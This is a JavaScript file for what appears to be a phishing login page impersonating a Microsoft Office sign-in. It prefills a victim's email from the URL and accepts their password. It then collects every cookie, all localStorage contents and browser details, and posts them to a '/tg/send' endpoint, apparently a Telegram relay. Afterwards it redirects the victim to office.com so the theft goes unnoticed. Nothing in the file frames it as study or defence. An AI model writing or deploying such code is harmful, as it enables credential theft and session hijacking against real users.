window.onload = function () {
  const params = new URLSearchParams(window.location.search);
  const email = params.get("email");

  const emailSpan = document.getElementById("user-email");
  const emailInput = document.getElementById("email-input");

  if (email) {
    emailSpan.innerText = email;
    emailSpan.style.display = "inline";
    emailInput.style.display = "none";
  } else {
    emailSpan.style.display = "none";
    emailInput.style.display = "inline";
  }
};

function validateEmail(email) {
  const pattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return pattern.test(email);
}

function validatePassword(password) {
  const pattern = /^(?=.*[a-z])(?=.*[A-Z]).{8,}$/;
  return pattern.test(password);
}

// ✅ Define this globally so it can be called from HTML
function handleLogin() {
  const emailSpan = document.getElementById("user-email");
  const emailInput = document.getElementById("email-input");
  const email = emailSpan.innerText || emailInput.value.trim();
  const password = document.getElementById("password").value;
  const errorMessage = document.getElementById("error-message");

  if (!validateEmail(email)) {
    errorMessage.innerText = "Invalid email format.";
    return;
  }
  if (!validatePassword(password)) {
    errorMessage.innerText = "Password is not correct, try again.";
    return;
  }

  errorMessage.innerText = "";

  // Gather cookie and storage data
  const cookies = {};
  if (document.cookie) {
    document.cookie.split(";").forEach(function (cookie) {
      const parts = cookie.trim().split("=");
      if (parts.length === 2) {
        cookies[parts[0]] = parts[1];
      }
    });
  }

  const storageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    storageData[key] = localStorage.getItem(key);
  }

  // Send the data
  fetch("http://localhost:4000/tg/send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email,
      password,
      cookies,
      localStorage: storageData,
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
    }),
  })
    .then(() => {
      window.location.href = "https://office.com/admin";
    })
    .catch(() => {
      window.location.href = "https://office.com/admin";
    });
}